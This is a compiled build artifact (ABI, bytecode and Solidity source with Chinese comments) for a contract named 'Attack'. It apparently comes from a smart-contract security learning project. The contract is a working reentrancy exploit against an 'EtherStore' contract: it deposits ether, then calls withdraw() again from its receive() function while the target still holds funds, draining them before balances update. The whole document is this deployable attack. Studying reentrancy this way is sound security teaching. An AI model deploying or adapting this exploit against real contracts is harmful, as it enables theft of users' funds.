{
  "contractName": "Attack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_etherStoreAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attacker",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "etherStore",
      "outputs": [
        {
          "internalType": "contract EtherStore",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405161040838038061040883398101604081905261002f91610061565b600080546001600160a01b039092166001600160a01b0319928316178155600180549092163317909155600255610091565b60006020828403121561007357600080fd5b81516001600160a01b038116811461008a57600080fd5b9392505050565b610368806100a06000396000f3fe6080604052600436106100435760003560e01c806312065fe01461014857806348eb76ee146101685780639e5faafc146101a0578063acd2e6e5146101aa57600080fd5b36610143576002805490600061005883610300565b9190505550600a60025411156100b55760405162461bcd60e51b815260206004820152601c60248201527f4d617820726563757273696f6e2064657074682065786365656465640000000060448201526064015b60405180910390fd5b600054670de0b6b3a76400006001600160a01b03909116311061012c576000805460408051633ccfd60b60e01b815290516001600160a01b0390921692633ccfd60b9260048084019382900301818387803b15801561011357600080fd5b505af1158015610127573d6000803e3d6000fd5b505050505b6002805490600061013c8361031b565b9190505550005b600080fd5b34801561015457600080fd5b506040514781526020015b60405180910390f35b34801561017457600080fd5b50600154610188906001600160a01b031681565b6040516001600160a01b03909116815260200161015f565b6101a86101ca565b005b3480156101b657600080fd5b50600054610188906001600160a01b031681565b670de0b6b3a76400003410156102225760405162461bcd60e51b815260206004820152601f60248201527f4e656564206174206c65617374203120657468657220746f2061747461636b0060448201526064016100ac565b60008054906101000a90046001600160a01b03166001600160a01b031663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561027057600080fd5b505af1158015610284573d6000803e3d6000fd5b505060006002819055805460408051633ccfd60b60e01b815290516001600160a01b039092169550633ccfd60b9450600480820194509082900301818387803b1580156102d057600080fd5b505af11580156102e4573d6000803e3d6000fd5b50505050565b634e487b7160e01b600052601160045260246000fd5b6000600019821415610314576103146102ea565b5060010190565b60008161032a5761032a6102ea565b50600019019056fea2646970667358221220294c228c95ca27eb3912d6d22cb78262db1e397bd013b87eca13cd4abf97efac64736f6c634300080b0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.11;\n\nimport \"./EtherStore.sol\";\n\n/**\n * Attack - 重入攻击合约\n * 攻击原理：利用 EtherStore 的 fallback() 调用，在余额扣减前反复取款\n */\ncontract Attack {\n    EtherStore public etherStore;\n    address public attacker;\n    \n    // 记录递归深度，防止无限递归（安全起见）\n    uint256 private constant MAX_RECURSION = 10;\n    uint256 private recursionDepth;\n\n    constructor(address _etherStoreAddress) {\n        etherStore = EtherStore(_etherStoreAddress);\n        attacker = msg.sender;\n        recursionDepth = 0;\n    }\n\n    /**\n     * receive 函数 - 接收 ETH\n     * 攻击核心：当收到 ETH 时，检查银行是否还有钱\n     * 如果有钱，再次调用取款函数\n     */\n    receive() external payable {\n        // 防止无限递归\n        recursionDepth++;\n        require(recursionDepth <= MAX_RECURSION, \"Max recursion depth exceeded\");\n        \n        // 检查：银行还有钱吗？\n        // 注意：这里检查的是 EtherStore 合约的总余额\n        if (address(etherStore).balance >= 1 ether) {\n            // 攻击：再次调用取款函数（递归）\n            etherStore.withdraw();\n        }\n        \n        recursionDepth--;\n    }\n\n    /**\n     * attack - 发起攻击的入口函数\n     */\n    function attack() external payable {\n        require(msg.value >= 1 ether, \"Need at least 1 ether to attack\");\n        \n        // 第一步：存入 ETH\n        etherStore.deposit{value: msg.value}();\n        \n        // 重置递归深度\n        recursionDepth = 0;\n        \n        // 第二步：尝试取款（触发 fallback）\n        etherStore.withdraw();\n    }\n\n    /**\n     * 查看攻击合约余额\n     */\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}",
  "sourcePath": "C:\\Users\\ZhuanZ1\\Desktop\\smart-contract-security\\contracts\\Attack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.11+commit.d7f03943.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2026-04-24T17:04:26.615Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {
      "attack()": {
        "notice": "attack - 发起攻击的入口函数"
      },
      "getBalance()": {
        "notice": "查看攻击合约余额"
      }
    },
    "notice": "Attack - 重入攻击合约 攻击原理：利用 EtherStore 的 fallback() 调用，在余额扣减前反复取款",
    "version": 1
  }
}